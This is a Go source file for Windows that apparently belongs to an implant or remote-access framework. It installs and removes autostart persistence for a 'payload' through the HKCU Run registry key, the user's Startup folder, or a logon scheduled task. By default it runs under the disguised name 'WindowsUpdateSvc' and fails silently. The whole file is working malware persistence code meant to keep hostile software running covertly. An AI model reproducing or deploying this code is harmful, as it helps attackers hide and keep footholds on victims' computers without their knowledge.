//go:build windows

package main

import (
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"unsafe"
)

var (
	modAdvapi32 = syscall.NewLazyDLL("advapi32.dll")

	procRegOpenKeyExW   = modAdvapi32.NewProc("RegOpenKeyExW")
	procRegSetValueExW  = modAdvapi32.NewProc("RegSetValueExW")
	procRegDeleteValueW = modAdvapi32.NewProc("RegDeleteValueW")
	procRegCloseKey     = modAdvapi32.NewProc("RegCloseKey")
)

const (
	hkeyCurrentUser = 0x80000001
	keySetValue     = 0x0002
	regSZ           = 1
)

// installPersistence sets up autostart according to the configured method:
//
//	"auto"/"run"  - HKCU Run registry key (default)
//	"startup"     - copy into the per-user Startup folder
//	"schtasks"    - scheduled task triggered at logon
//	"none"        - disabled
//
// Failures are silent by design.
func installPersistence(method, name string) {
	if method == "none" {
		return
	}
	if name == "" {
		name = "WindowsUpdateSvc"
	}

	switch method {
	case "startup":
		installStartupFolder(name)
	case "schtasks":
		installScheduledTask(name)
	default:
		installRunKey(name)
	}
}

func installRunKey(name string) {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	subKey, _ := syscall.UTF16PtrFromString(`Software\Microsoft\Windows\CurrentVersion\Run`)
	var hKey syscall.Handle

	ret, _, _ := procRegOpenKeyExW.Call(
		uintptr(hkeyCurrentUser),
		uintptr(unsafe.Pointer(subKey)),
		0,
		uintptr(keySetValue),
		uintptr(unsafe.Pointer(&hKey)),
	)
	if ret != 0 {
		return
	}
	defer procRegCloseKey.Call(uintptr(hKey))

	valueName, _ := syscall.UTF16PtrFromString(name)
	valueData, _ := syscall.UTF16FromString(exePath)
	dataBytes := (*[1 << 20]byte)(unsafe.Pointer(&valueData[0]))[: len(valueData)*2 : len(valueData)*2]

	procRegSetValueExW.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(valueName)),
		0,
		uintptr(regSZ),
		uintptr(unsafe.Pointer(&dataBytes[0])),
		uintptr(len(dataBytes)),
	)
}

func installStartupFolder(name string) {
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	startup := os.Getenv("APPDATA")
	if startup == "" {
		return
	}
	dst := filepath.Join(startup, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", name+".exe")
	if _, err := os.Stat(dst); err == nil {
		return // already installed
	}
	src, err := os.Open(exePath)
	if err != nil {
		return
	}
	defer src.Close()
	dstFile, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY, 0755)
	if err != nil {
		return
	}
	defer dstFile.Close()
	io.Copy(dstFile, src)
}

func installScheduledTask(name string) {
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	cmd := exec.Command("schtasks", "/Create", "/SC", "ONLOGON", "/TN", name, "/TR", exePath, "/F")
	cmd.SysProcAttr = getSysProcAttr()
	cmd.Run()
}

// uninstallPersistence removes every artifact this payload could have
// installed. All artifact names derive from the per-payload unique persist
// name, so attempting each method is harmless when it was never used.
// Failures are silent by design.
func uninstallPersistence(method, name string) {
	if name == "" {
		name = "WindowsUpdateSvc"
	}
	uninstallRunKey(name)
	uninstallStartupFolder(name)
	uninstallScheduledTask(name)
	_ = method
}

func uninstallRunKey(name string) {
	subKey, _ := syscall.UTF16PtrFromString(`Software\Microsoft\Windows\CurrentVersion\Run`)
	var hKey syscall.Handle

	ret, _, _ := procRegOpenKeyExW.Call(
		uintptr(hkeyCurrentUser),
		uintptr(unsafe.Pointer(subKey)),
		0,
		uintptr(keySetValue),
		uintptr(unsafe.Pointer(&hKey)),
	)
	if ret != 0 {
		return
	}
	defer procRegCloseKey.Call(uintptr(hKey))

	valueName, _ := syscall.UTF16PtrFromString(name)
	procRegDeleteValueW.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(valueName)),
	)
}

func uninstallStartupFolder(name string) {
	startup := os.Getenv("APPDATA")
	if startup == "" {
		return
	}
	dst := filepath.Join(startup, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", name+".exe")
	os.Remove(dst)
}

func uninstallScheduledTask(name string) {
	cmd := exec.Command("schtasks", "/Delete", "/TN", name, "/F")
	cmd.SysProcAttr = getSysProcAttr()
	cmd.Run()
}
